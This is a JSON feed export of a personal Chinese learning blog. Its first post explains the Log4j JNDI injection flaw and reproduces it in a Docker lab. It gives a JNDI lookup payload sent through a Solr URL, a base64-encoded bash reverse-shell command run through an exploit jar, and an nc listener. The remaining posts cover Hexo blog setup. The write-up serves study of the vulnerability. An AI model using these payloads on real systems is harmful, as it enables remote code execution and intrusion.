{
    "version": "https://jsonfeed.org/version/1",
    "title": "GoA1's Blog",
    "description": "Personal Learning Blog",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/11/07/log4j%20%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/",
            "url": "http://example.com/2022/11/07/log4j%20%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/",
            "title": "log4j漏洞复现",
            "date_published": "2022-11-07T11:27:15.235Z",
            "content_html": "<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言：</h3>\n<p>JNDI (Java Naming and Directory Interface，JAVA 命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。<br />\n简单理解：有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了<br />\n不同的数据源肯定有不同的查找方式，使用 JNDI 也只是一个上层封装，在它下面也支持很多种具体的数据源。<br />\n<img data-src=\"https://img-blog.csdnimg.cn/7932bb1398374f7d8d3f232989b21874.jpeg#pic_center\" alt=\"LDAP\" /></p>\n<p>LDAP (轻量级目录访问协议)<br />\n 有一个类似于字典的数据源，你可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。</p>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理：</h3>\n<p>假如某一个 Java 程序中，将浏览器的类型记录到了日志中：<br />\nString userAgent = request.getHeader(&quot;User-Agent&quot;);<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2xvZ2dlci5pbmZv\">logger.info</span>(userAgent);<br />\n 这个 UA 头是外界输入的可被自定义的值，若其中是这样一串字符<br />\n ${jndi:ldap://127.0.0.1/exploit}<br />\n log4j 将会对这行要输出的字符串进行解析。<br />\n首先，它发现了字符串中有 ${}，知道这个里面包裹的内容是要单独处理的。<br />\n进一步解析，发现是 JNDI 扩展内容。<br />\n再进一步，发现是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。<br />\n最后，调用具体复制 LDAP 的模块去请求对应的数据。<br />\n问题就出在这个请求数据可以请求 Java 对象，java 对象一般只存在于内存中，单页可以通过序列化的方式将其存储到文件中，或者通过网络传输。<br />\n更危险的在于：JNDI 还支持一个叫命名引用 (Naming References) 的方式，可以通过远程下载一个 class 文件，然后下载后加载起来构建对象。<br />\n<mark>核心问题：JNDI 可以远程下载 class 文件来构建对象！</mark><br />\n如果远程下载的 url 指向的是一个恶意攻击的服务器，下载的 class 文件里面含有恶意代码，本地服务器就 G 了</p>\n<h3 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 漏洞复现：</h3>\n<p>①kali docker 启动漏洞环境<br />\n cd /home/ayu/vulhub/log4j<br />\ndocker-compose up -d<br />\n②访问 ip:8983web 界面（是个 apache solr 界面</p>\n<p>③bp 抓取刷新界面数据包（需要放两个包，得到 accept 有 json 方法的包<br />\n<img data-src=\"https://img-blog.csdnimg.cn/13d01aaabe924609803818508686c1e3.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.4zybrx.dnslog.cn}<br />\n 拼接路径访问 dnslog，状态码为 400 且 dnslog 有访问记录算存在漏洞<br />\n<img data-src=\"https://img-blog.csdnimg.cn/707d555834854b30bda686bad42a555c.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n<img data-src=\"https://img-blog.csdnimg.cn/fe801eb4379846cd9760709f68064321.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n④进一步利用 log4j getshell<br />\nJNDI 工具地址：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Qtcm4vdnVsQm94L2Jsb2IvbWFpbi9KTkRJLUluamVjdGlvbi1FeHBsb2l0LTEuMC1TTkFQU0hPVC1hbGwuamFy\">https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span></p>\n</blockquote>\n<p>下载工具：</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Qtcm4vdnVsQm94L2Jsb2IvbWFpbi9KTkRJLUluamVjdGlvbi1FeHBsb2l0LTEuMC1TTkFQU0hPVC1hbGwuamFy\">https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span></p>\n</blockquote>\n<blockquote>\n<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}&quot; -A &quot;192.168.0.104&quot;<br />\n(base64 的内容为 bash -i&gt;&amp; /dev/tcp/ 要反弹的 ip / 端口号 0&gt;&amp;1，-A “工具所在的 ip”)</p>\n</blockquote>\n<p>工具运行生成如下界面，会有几个紫色字体 payload 生成，直接拼接到 /solr/admin/cores?action=${jndi:payload}<br />\n<img data-src=\"https://img-blog.csdnimg.cn/ee3b59fe874443a7ace554edffd95879.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n Windows10 开启 nc 监听<br />\n<img data-src=\"https://img-blog.csdnimg.cn/c13f4435024a4d4c9816b000a16c47cc.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n若 一个 payload 没反弹成功就多试两个，成功了 nc 直接获得反弹 shell（且这个反弹 shell 不会乱码，试验过在 kali 端直接执行 bash 反弹过来的 shell 都会乱码，工具有点顶）<br />\n<img data-src=\"https://img-blog.csdnimg.cn/b3949e8b9bb24ec290a72d86409edbad.png#pic_center\" alt=\"在这里插入图片描述\" /><img data-src=\"https://img-blog.csdnimg.cn/a3527963b53b4faabb361ac6a59de50f.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>感谢 h1dm 师傅的复现文章</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU2NjA3NzY4L2FydGljbGUvZGV0YWlscy8xMjUxNTQ0MzY=\">https://blog.csdn.net/qq_56607768/article/details/125154436</span></p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/07/hexo%20shoka%20blog%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/",
            "url": "http://example.com/2022/11/07/hexo%20shoka%20blog%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/",
            "title": "hexo Shoka blog搭建小记",
            "date_published": "2022-11-07T11:09:13.390Z",
            "content_html": "<p>____这篇小记起源于心血来潮，本人突然想自己搭个博客记录记录自己的一些学习过程。过程还算顺利，也比较幸运没碰上什么让人头疼的环境问题，就写一些自己遇到的小坑和实现某些功能的过程吧。</p>\n<h3 id=\"hexo如何识别文章\"><a class=\"anchor\" href=\"#hexo如何识别文章\">#</a> hexo 如何识别文章</h3>\n<p>需要保证在 MD 文件的开头加上如下格式的文章头，hexo 才能识别到这是一篇文章，然后文章格式什么的才会比较对 (胡说八道确信点头.jpg)</p>\n<blockquote>\n<hr />\n<p>title: first</p>\n<hr />\n</blockquote>\n<h3 id=\"md文章丢失图片问题\"><a class=\"anchor\" href=\"#md文章丢失图片问题\">#</a> MD 文章丢失图片问题</h3>\n<p>第一次尝试上传文章发现文章到 hexo 里会丢失图片 (不知道是不是我的 Markdown 编辑器比较 low)，经好友指点可以借助 CSDN 发博客，然后导出 MD 格式，再进行上传就不会丢失文章中的图片咯！</p>\n<h3 id=\"hexo基础命令\"><a class=\"anchor\" href=\"#hexo基础命令\">#</a> hexo 基础命令</h3>\n<p>hexo generate  生成静态文件，可缩写为 hexo -g</p>\n<p>hexo server 启动服务器，可缩写为 hexo -s</p>\n<p>hexo clean 清除缓存 (删除 public 文件夹)</p>\n<p>hexo deploy 将网站部署到服务器上 (会同步 blog 内的 public 文件夹到仓库) 可简写为 hexo d，hexo d -g 部署前预先生成静态文件<br />\n想要上传文章常规就是先 hexo s 本地检查一下调试效果先，没问题就 hexo g 再 hexo d 套餐然后等待上传完成即可。<br />\nTips：<br />\n①github 服务器可能需要点加载时间，经常显示上传成功但访问到博客还是未更新的状态，耐心等待即可。上传文章反正也是挺玄学一事。<br />\n②出现 Deploy done：git 就基本安啦！(如果报错可以多 hexo d 两次，本人好几次都是这样解决的，以不变应万变。如果还是报错就具体问题具体分析吧..<br />\n<img data-src=\"https://img-blog.csdnimg.cn/51c9a88b4cbc40c5899699557c4a0d0b.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<h3 id=\"更改文章展示图\"><a class=\"anchor\" href=\"#更改文章展示图\">#</a> 更改文章展示图</h3>\n<p>在文章.md 的 Front Matter 设置 cover：image path 即可更改文章的展示图（栗子是 (root)/source/assets 下的图片）</p>\n<blockquote>\n<pre><code>---\ncover: assets/goodluck.jpg\n# 或者写成\ncover: http://placehold.it/350x150.jpg\n---\n</code></pre>\n</blockquote>\n<p><img data-src=\"https://img-blog.csdnimg.cn/9b3805e8e6c240a18762a2a00f92c7fe.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>设置 fancybox: false ，可以关闭文章页的图片展示功能。</p>\n<p>&lt;br/&gt;</p>\n<h3 id=\"文章置顶\"><a class=\"anchor\" href=\"#文章置顶\">#</a> 文章置顶</h3>\n<p>在文章的 Front Matter 设置 sticky: true ，则该文章将显示在首页最上方的 置顶文章 列。</p>\n<pre><code>---\nsticky: true\n---\n</code></pre>\n<p>每篇博客的 front matter 都需要加上以下代码，这样才会被认为是一篇博客</p>\n<pre><code>---\ntitle: 文章的标题\ndate: 文章发布是年/月/日 时/分/秒\ncategories:\n- [博客的分类]\ntags:\n---\n# 这里开始使用Markdown书写博客正文\n\n</code></pre>\n<h3 id=\"更改点击烟花效果\"><a class=\"anchor\" href=\"#更改点击烟花效果\">#</a> 更改点击烟花效果</h3>\n<p>相关配置文件：(root)/themes/shoka/_config.yml</p>\n<p>找到 fireworks 部分</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8f725d52691e4ff5b40f68c497f26bc0.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>特地查了下 rgba 的 a 代表透明度（顺带提一嘴，多种颜色的点击效果有点吓人，果然是越简单越高级、、）</p>\n<p>甩个链接里面有各种颜色的 rgb 值</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudG9vbGhlbHBlci5jbi9Db2xvci9SR0JUb0hleA==\">https://www.toolhelper.cn/Color/RGBToHex</span></p>\n</blockquote>\n<h3 id=\"这篇小记不出意外会经常更新~只要我不偷懒\"><a class=\"anchor\" href=\"#这篇小记不出意外会经常更新~只要我不偷懒\">#</a> 这篇小记不出意外会经常更新～(只要我不偷懒..)</h3>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/02/hello-world/",
            "url": "http://example.com/2022/11/02/hello-world/",
            "title": "Hello World",
            "date_published": "2022-11-02T07:35:22.427Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}